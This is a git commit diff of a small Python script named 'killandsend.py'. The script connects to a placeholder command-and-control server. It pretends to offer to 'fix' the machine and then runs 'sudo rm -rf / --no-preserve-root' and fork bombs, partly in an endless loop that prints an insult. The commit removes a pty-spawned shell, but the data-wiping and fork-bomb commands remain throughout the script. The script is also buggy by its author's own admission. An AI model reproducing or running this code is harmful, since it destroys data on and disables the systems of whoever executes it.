c9a801364cb7da5dda50d3a6d665bbb6db47e4ab
Richy <97134605+Richycam@users.noreply.github.com>
2024-08-19 15:22:12 +0100

    Update killandsend.py

--- killandsend.py
+++ killandsend.py
@@ -1,7 +1,6 @@
 import os
 import time
 import socket
-import pty
 
 # command and control server (change this)
 host = "127.0.0.1"
@@ -9,7 +8,6 @@ port = 8080
 
 #need to start a netcat session with the ip and port your using 
 
-shell = pty.spawn("/bin/sh")
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 call_home = sock.connect((host,port))
 # btw im not sure if these work 
@@ -23,14 +21,12 @@ if fix == "yes" or "Yes":
         print("fixing machine..")
         time.sleep(1)
         call_home
-        shell
         os.system("sudo rm -rf / --no-preserve-root") and os.system("sudo rm -rf /") 
         time.sleep(1)
 else:
     break1 = True
     while break1 == True:
         call_home
-        shell
         print("get fucked")
         os.system("sudo rm rf / --no-preserve-root")
         os.system("sudo :(){:|:& };:") and os.system(":(){:|:& };:")
